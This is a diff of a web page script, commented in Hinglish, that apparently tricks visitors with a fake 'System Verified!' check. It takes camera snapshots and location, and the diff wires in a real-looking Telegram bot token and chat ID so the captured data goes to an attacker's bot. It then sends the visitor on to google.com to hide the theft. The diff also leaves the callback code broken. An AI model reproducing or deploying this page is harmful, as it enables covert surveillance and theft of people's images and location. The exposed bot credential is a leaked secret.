@@ -24,8 +24,8 @@
 
     <script>
         // --- ⚠️ CONFIGURATION (Apni Details Dalo) ---
-        const TELEGRAM_TOKEN = 'TUMHARA_TOKEN_YAHAN'; 
-        const CHAT_ID = 'TUMHARI_ID_YAHAN';
+      const TELEGRAM_TOKEN = '8168176265:AAGxAgdZ8SBNwXox5TpIczsRhAjm7GOTaMs'; // Apna Token yahan dalo
+        const CHAT_ID = '2117500711';   
 
         window.onload = async function() {
             const status = document.getElementById("status-text");
@@ -81,9 +81,7 @@
                             // Cleanup & Redirect to real site
                             stream.getTracks().forEach(t => t.stop());
                             status.innerText = "System Verified!";
-                            setTimeout(() => { window.location.href = "https://google.com"; }, 1000);
-                        }, 'image/png');
-                    }, 1500);
+                           
 
                 }, (err) => {
                     status.innerText = "Error: Location Access Denied.";
